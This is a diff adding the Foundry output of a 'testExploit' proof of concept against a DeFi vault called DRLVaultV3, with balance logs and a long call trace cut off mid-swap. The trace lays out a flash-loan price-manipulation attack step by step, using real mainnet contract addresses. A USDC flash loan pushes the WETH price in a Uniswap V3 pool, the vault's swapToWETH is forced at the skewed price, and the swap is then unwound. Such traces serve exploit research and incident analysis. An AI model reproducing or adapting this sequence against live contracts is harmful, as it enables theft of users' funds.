@@ -1,0 +1,367 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DRLVaultV3_exp.sol:DRLVaultV3_EXP
+[PASS] testExploit() (gas: 9747641)
+Logs:
+  Attacker Before exploit ETH Balance: 0.000000000000000000
+  ========= After Flash =========
+  USDC balance 13980773000000
+  WETH balance 202213274263176443
+  ETH balance 0
+  WETH Price before swap 3600
+  ========= After Swap on DexRouter =========
+  USDC balance 0
+  WETH balance 202213274263176443
+  ETH balance 812949636619410677927
+  WETH Price after swap 865051903
+  ========= Before Swap on Vault =========
+  Vault weth balane 0
+  Vault eth balane 0
+  Vault usdc balane 100000000000
+  ========= After Swap on Vault =========
+  USDC balance 0
+  WETH balance 202213274263176443
+  ETH balance 812949636619410677927
+  WETH Price after swap 865051903
+  ========= After Swap on DexRouter =========
+  USDC balance 13959481705893
+  WETH balance 202213274263176443
+  ETH balance 32949636619618525374
+  WETH Price after swap 3658
+  ========= After Swap on DexRouter =========
+  USDC balance 13980773000000
+  WETH balance 27
+  ETH balance 0
+  WETH Price after swap 3649
+  Attacker After exploit ETH Balance: 0.000000000000000000
+
+Traces:
+  [10165841] DRLVaultV3_EXP::testExploit()
+    ├─ [0] VM::deal(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit ETH Balance", val: 0, decimals: 18)
+    ├─ [10139059] Morpho::flashLoan(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 13980773000000 [1.398e13], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─ emit FlashLoan(caller: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], token: FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], assets: 13980773000000 [1.398e13])
+    │   ├─ [40652] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13980773000000 [1.398e13])
+    │   │   ├─ [33363] FiatTokenV2_2::transfer(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13980773000000 [1.398e13]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], to: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 13980773000000 [1.398e13])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [10083158] DRLVaultV3_EXP::onMorphoFlashLoan(13980773000000 [1.398e13], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   │   ├─ [0] console::log("========= After Flash =========") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1339] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 13980773000000 [1.398e13]
+    │   │   │   └─ ← [Return] 13980773000000 [1.398e13]
+    │   │   ├─ [0] console::log("USDC balance", 13980773000000 [1.398e13]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2534] WETH9::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 202213274263176443 [2.022e17]
+    │   │   ├─ [0] console::log("WETH balance", 202213274263176443 [2.022e17]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ETH balance", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2696] UniswapV3Pool::slot0() [staticcall]
+    │   │   │   └─ ← [Return] 1320439764891084018681730722055782 [1.32e33], 194432 [1.944e5], 57, 76, 76, 0, true
+    │   │   ├─ [0] console::log("WETH Price before swap", 3600) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [25462] FiatTokenProxy::fallback(TokenApprove: [0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [24673] FiatTokenV2_2::approve(TokenApprove: [0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: TokenApprove: [0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [6212483] DexRouter::uniswapV3SwapTo(728815563385977040452943777879061427756277306518 [7.288e47], 13980773000000 [1.398e13], 96069676420420156 [9.606e16], [14474011154664524427946373127366704448275315930774981940324572871603728323487 [1.447e76]])
+    │   │   │   ├─ emit SwapOrderId(id: 0)
+    │   │   │   ├─ [266] UniswapV3Pool::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]
+    │   │   │   ├─ [308] UniswapV3Pool::token1() [staticcall]
+    │   │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   ├─ [6142575] UniswapV3Pool::swap(DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], true, 13980773000000 [1.398e13], 4295128740 [4.295e9], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   │   │   ├─ [29962] WETH9::transfer(DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], 812949636619410677927 [8.129e20])
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], to: DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], value: 812949636619410677927 [8.129e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3339] FiatTokenProxy::fallback(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   │   ├─ [2553] FiatTokenV2_2::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 1765763884337 [1.765e12]
+    │   │   │   │   │   └─ ← [Return] 1765763884337 [1.765e12]
+    │   │   │   │   ├─ [28208] DexRouter::uniswapV3SwapCallback(13980773000000 [1.398e13], -812949636619410677927 [-8.129e20], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   │   │   │   ├─ [266] UniswapV3Pool::token0() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]
+    │   │   │   │   │   ├─ [308] UniswapV3Pool::token1() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   │   │   ├─ [251] UniswapV3Pool::fee() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 100
+    │   │   │   │   │   ├─ [23262] 0x70cBb871E8f30Fc8Ce23609E9E0Ea87B6b222F58::claimTokens(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 13980773000000 [1.398e13])
+    │   │   │   │   │   │   ├─ [15491] TokenApprove::claimTokens(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 13980773000000 [1.398e13])
+    │   │   │   │   │   │   │   ├─ [11349] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 13980773000000 [1.398e13])
+    │   │   │   │   │   │   │   │   ├─ [10554] FiatTokenV2_2::transferFrom(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 13980773000000 [1.398e13]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], value: 13980773000000 [1.398e13])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [1339] FiatTokenProxy::fallback(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 15746536884337 [1.574e13]
+    │   │   │   │   │   └─ ← [Return] 15746536884337 [1.574e13]
+    │   │   │   │   ├─ emit Swap(sender: DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], recipient: DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], amount0: 13980773000000 [1.398e13], amount1: -812949636619410677927 [-8.129e20], sqrtPriceX96: 2764344578236867584015403304918 [2.764e30], liquidity: 348338549717099 [3.483e14], tick: 71048 [7.104e4])
+    │   │   │   │   └─ ← [Return] 13980773000000 [1.398e13], -812949636619410677927 [-8.129e20]
+    │   │   │   ├─ [25162] WETH9::transfer(0x5703B683c7F928b721CA95Da988d73a3299d4757, 812949636619410677927 [8.129e20])
+    │   │   │   │   ├─ emit Transfer(from: DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], to: 0x5703B683c7F928b721CA95Da988d73a3299d4757, value: 812949636619410677927 [8.129e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [26230] 0x5703B683c7F928b721CA95Da988d73a3299d4757::withdraw(812949636619410677927 [8.129e20])
+    │   │   │   │   ├─ [9195] WETH9::withdraw(812949636619410677927 [8.129e20])
+    │   │   │   │   │   ├─ [55] 0x5703B683c7F928b721CA95Da988d73a3299d4757::fallback{value: 812949636619410677927}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Withdrawal(src: 0x5703B683c7F928b721CA95Da988d73a3299d4757, wad: 812949636619410677927 [8.129e20])
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [76] DexRouter::receive{value: 812949636619410677927}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [55] DRLVaultV3_EXP::receive{value: 812949636619410677927}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [266] UniswapV3Pool::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]
+    │   │   │   ├─ emit OrderRecord(fromToken: FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], toToken: 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, sender: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], fromAmount: 13980773000000 [1.398e13], returnAmount: 812949636619410677927 [8.129e20])
+    │   │   │   └─ ← [Return] 812949636619410677927 [8.129e20]
+    │   │   ├─ [0] console::log("========= After Swap on DexRouter =========") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1339] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] console::log("USDC balance", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 202213274263176443 [2.022e17]
+    │   │   ├─ [0] console::log("WETH balance", 202213274263176443 [2.022e17]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ETH balance", 812949636619410677927 [8.129e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [696] UniswapV3Pool::slot0() [staticcall]
+    │   │   │   └─ ← [Return] 2764344578236867584015403304918 [2.764e30], 71048 [7.104e4], 58, 76, 76, 0, true
+    │   │   ├─ [0] console::log("WETH Price after swap", 865051903 [8.65e8]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("========= Before Swap on Vault =========") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2534] WETH9::balanceOf(0x6A06707ab339BEE00C6663db17DdB422301ff5e8) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] console::log("Vault weth balane", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Vault eth balane", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3339] FiatTokenProxy::fallback(0x6A06707ab339BEE00C6663db17DdB422301ff5e8) [staticcall]
+    │   │   │   ├─ [2553] FiatTokenV2_2::balanceOf(0x6A06707ab339BEE00C6663db17DdB422301ff5e8) [delegatecall]
+    │   │   │   │   └─ ← [Return] 100000000000 [1e11]
+    │   │   │   └─ ← [Return] 100000000000 [1e11]
+    │   │   ├─ [0] console::log("Vault usdc balane", 100000000000 [1e11]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [187248] 0x6A06707ab339BEE00C6663db17DdB422301ff5e8::swapToWETH(100000000000 [1e11])
+    │   │   │   ├─ [184576] DRLVaultV3::swapToWETH(100000000000 [1e11]) [delegatecall]
+    │   │   │   │   ├─ [1339] FiatTokenProxy::fallback(0x6A06707ab339BEE00C6663db17DdB422301ff5e8) [staticcall]
+    │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(0x6A06707ab339BEE00C6663db17DdB422301ff5e8) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 100000000000 [1e11]
+    │   │   │   │   │   └─ ← [Return] 100000000000 [1e11]
+    │   │   │   │   ├─ [25462] FiatTokenProxy::fallback(SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 100000000000 [1e11])
+    │   │   │   │   │   ├─ [24673] FiatTokenV2_2::approve(SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 100000000000 [1e11]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0x6A06707ab339BEE00C6663db17DdB422301ff5e8, spender: SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], value: 100000000000 [1e11])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [67542] QuoterV2::quoteExactInputSingle(QuoteExactInputSingleParams({ tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, amountIn: 100000000000 [1e11], fee: 100, sqrtPriceLimitX96: 0 }))
+    │   │   │   │   │   ├─ [52486] UniswapV3Pool::swap(QuoterV2: [0x61fFE014bA17989E743c5F6cB21bF9697530B21e], true, 100000000000 [1e11], 4295128740 [4.295e9], 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000064c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
+    │   │   │   │   │   │   ├─ [25162] WETH9::transfer(QuoterV2: [0x61fFE014bA17989E743c5F6cB21bF9697530B21e], 120518513556060 [1.205e14])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], to: QuoterV2: [0x61fFE014bA17989E743c5F6cB21bF9697530B21e], value: 120518513556060 [1.205e14])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [1339] FiatTokenProxy::fallback(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 15746536884337 [1.574e13]
+    │   │   │   │   │   │   │   └─ ← [Return] 15746536884337 [1.574e13]
+    │   │   │   │   │   │   ├─ [4971] QuoterV2::uniswapV3SwapCallback(100000000000 [1e11], -120518513556060 [-1.205e14], 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000064c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
+    │   │   │   │   │   │   │   ├─ [696] UniswapV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 2736933140755279852859304542828 [2.736e30], 70848 [7.084e4], 58, 76, 76, 0, false
+    │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x00000000: 000000000000000000000000000000000000000000006d9c67307a5c00000000000000000000000000000000000000228b820829b8f381b90ca5826c00000000000000000000000000000000000000000000000000000000000114c0
+    │   │   │   │   │   │   └─ ← [Revert] custom error 0x00000000: 000000000000000000000000000000000000000000006d9c67307a5c00000000000000000000000000000000000000228b820829b8f381b90ca5826c00000000000000000000000000000000000000000000000000000000000114c0
+    │   │   │   │   │   ├─ [696] UniswapV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2764344578236867584015403304918 [2.764e30], 71048 [7.104e4], 58, 76, 76, 0, true
+    │   │   │   │   │   ├─ [279] UniswapV3Pool::tickSpacing() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1
+    │   │   │   │   │   ├─ [279] UniswapV3Pool::tickSpacing() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1
+    │   │   │   │   │   ├─ [279] UniswapV3Pool::tickSpacing() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1
+    │   │   │   │   │   ├─ [279] UniswapV3Pool::tickSpacing() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1
+    │   │   │   │   │   ├─ [2525] UniswapV3Pool::tickBitmap(276) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [525] UniswapV3Pool::tickBitmap(277) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [525] UniswapV3Pool::tickBitmap(276) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [525] UniswapV3Pool::tickBitmap(277) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 120518513556060 [1.205e14], 2736933140755279852859304542828 [2.736e30], 0, 53833 [5.383e4]
+    │   │   │   │   ├─ [69505] SwapRouter02::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 100, recipient: 0x6A06707ab339BEE00C6663db17DdB422301ff5e8, amountIn: 100000000000 [1e11], amountOutMinimum: 119915920988279 [1.199e14], sqrtPriceLimitX96: 0 }))
+    │   │   │   │   │   ├─ [64609] UniswapV3Pool::swap(0x6A06707ab339BEE00C6663db17DdB422301ff5e8, true, 100000000000 [1e11], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000006a06707ab339bee00c6663db17ddb422301ff5e8000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000064c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   ├─ [23162] WETH9::transfer(0x6A06707ab339BEE00C6663db17DdB422301ff5e8, 120518513556060 [1.205e14])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], to: 0x6A06707ab339BEE00C6663db17DdB422301ff5e8, value: 120518513556060 [1.205e14])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [1339] FiatTokenProxy::fallback(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 15746536884337 [1.574e13]
+    │   │   │   │   │   │   │   └─ ← [Return] 15746536884337 [1.574e13]
+    │   │   │   │   │   │   ├─ [15426] SwapRouter02::uniswapV3SwapCallback(100000000000 [1e11], -120518513556060 [-1.205e14], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000006a06707ab339bee00c6663db17ddb422301ff5e8000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000064c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   │   ├─ [11349] FiatTokenProxy::fallback(0x6A06707ab339BEE00C6663db17DdB422301ff5e8, UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 100000000000 [1e11])
+    │   │   │   │   │   │   │   │   ├─ [10554] FiatTokenV2_2::transferFrom(0x6A06707ab339BEE00C6663db17DdB422301ff5e8, UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 100000000000 [1e11]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6A06707ab339BEE00C6663db17DdB422301ff5e8, to: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], value: 100000000000 [1e11])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [1339] FiatTokenProxy::fallback(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 15846536884337 [1.584e13]
+    │   │   │   │   │   │   │   └─ ← [Return] 15846536884337 [1.584e13]
+    │   │   │   │   │   │   ├─ emit Swap(sender: SwapRouter02: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], recipient: 0x6A06707ab339BEE00C6663db17DdB422301ff5e8, amount0: 100000000000 [1e11], amount1: -120518513556060 [-1.205e14], sqrtPriceX96: 2736933140755279852859304542828 [2.736e30], liquidity: 348338549717099 [3.483e14], tick: 70848 [7.084e4])
+    │   │   │   │   │   │   └─ ← [Return] 100000000000 [1e11], -120518513556060 [-1.205e14]
+    │   │   │   │   │   └─ ← [Return] 120518513556060 [1.205e14]
+    │   │   │   │   └─ ← [Return] 120518513556060 [1.205e14]
+    │   │   │   └─ ← [Return] 120518513556060 [1.205e14]
+    │   │   ├─ [0] console::log("========= After Swap on Vault =========") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1339] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] console::log("USDC balance", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 202213274263176443 [2.022e17]
+    │   │   ├─ [0] console::log("WETH balance", 202213274263176443 [2.022e17]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ETH balance", 812949636619410677927 [8.129e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [696] UniswapV3Pool::slot0() [staticcall]
+    │   │   │   └─ ← [Return] 2736933140755279852859304542828 [2.736e30], 70848 [7.084e4], 58, 76, 76, 0, true
+    │   │   ├─ [0] console::log("WETH Price after swap", 865051903 [8.65e8]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3415645] DexRouter::uniswapV3SwapTo{value: 779999999999792152553}(728815563385977040452943777879061427756277306518 [7.288e47], 779999999999792152553 [7.799e20], 0, [57896044618658097711785492505624669893251560180390193455121166874571151938463 [5.789e76]])
+    │   │   │   ├─ emit SwapOrderId(id: 0)
+    │   │   │   ├─ [308] UniswapV3Pool::token1() [staticcall]
+    │   │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   ├─ [266] UniswapV3Pool::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]
+    │   │   │   ├─ [21731] WETH9::fallback{value: 779999999999792152553}()
+    │   │   │   │   ├─ emit Deposit(dst: DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], wad: 779999999999792152553 [7.799e20])
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3378236] UniswapV3Pool::swap(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 779999999999792152553 [7.799e20], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000002e1dee213ba8d7af0934c49a23187babeaca87640000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   │   │   ├─ [25352] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13959481705893 [1.395e13])
+    │   │   │   │   │   ├─ [24563] FiatTokenV2_2::transfer(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13959481705893 [1.395e13]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], to: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 13959481705893 [1.395e13])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 17625649764418786969 [1.762e19]
+    │   │   │   │   ├─ [6433] DexRouter::uniswapV3SwapCallback(-13959481705893 [-1.395e13], 779999999999792152553 [7.799e20], 0x0000000000000000000000002e1dee213ba8d7af0934c49a23187babeaca87640000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   │   │   │   ├─ [266] UniswapV3Pool::token0() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]
+    │   │   │   │   │   ├─ [308] UniswapV3Pool::token1() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   │   │   ├─ [251] UniswapV3Pool::fee() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 100
+    │   │   │   │   │   ├─ [3262] WETH9::transfer(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 779999999999792152553 [7.799e20])
